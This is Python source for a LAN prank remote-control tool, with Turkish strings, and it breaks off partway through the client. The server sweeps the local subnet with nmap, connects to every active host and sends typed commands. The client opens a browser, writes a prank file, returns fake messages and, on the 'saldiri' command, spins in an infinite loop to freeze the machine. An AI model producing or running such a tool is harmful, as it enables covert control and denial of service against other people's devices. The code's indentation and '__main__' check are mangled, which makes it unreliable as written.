server.py

import socket import threading import subprocess

def get_active_ips(): print("[✓] Ağ taranıyor...") result = subprocess.check_output(["nmap", "-sn", "192.168.1.0/24"]).decode() lines = result.split("\n") ips = [] for line in lines: if "Nmap scan report for" in line: ip = line.split()[-1] if ip.startswith("192.168.1.") and not ip.endswith(".1"): ips.append(ip) return ips

def client_handler(ip, port): try: s = socket.socket() s.settimeout(3) s.connect((ip, port)) print(f"[✓] Bağlantı başarılı: {ip}")

cihaz = s.recv(1024).decode()
    print(f"[✓] Cihaz: {cihaz}")

    while True:
        komut = input("Komut >> ")
        if komut == "exit":
            s.send(b"exit")
            break
        s.send(komut.encode())
        print(s.recv(2048).decode())

    s.close()
except Exception as e:
    print(f"[!] {ip} bağlantı hatası: {e}")

if name == "main": port = int(input("Port gir >> ")) aktifler = get_active_ips() print(f"[✓] Aktif IP'ler: {aktifler}")

for ip in aktifler:
    threading.Thread(target=client_handler, args=(ip, port)).start()

client.py

import socket import os import platform import threading

def cihaz_bilgisi(): sistem = platform.system() if sistem == "Linux" and "Android" in platform.platform(): return "Telefon" elif sistem == "Linux": return "Linux PC" elif sistem == "Windows": return "Windows PC" return "Bilinmeyen"

def komut_isle(komut): if komut == "google": if cihaz == "Telefon": os.system("termux-open-url https://www.google.com") elif cihaz == "Windows PC": os.system("start https://www.google.com") elif cihaz == "Linux PC": os.system("xdg-open https://www.google.com") return "[✓] Google açıldı" elif komut == "saldiri": while True: pass  # sonsuz döngü ile kastırma elif komut == "dosya": with open("saka.txt", "w") as f: f.write("Şaka modu aktif!") return "[✓] Dosya oluşturuldu: saka.txt" elif komut.startswith("arkaplan"): return "[✓] Arka plan değiştirildi (sahte mesaj)" elif komut.startswith("saka"): return f"[✓] Şaka mesajı: {komut[5:]}" else: return "[!] Geçersiz komut"

def baglanti_baslat(ip,

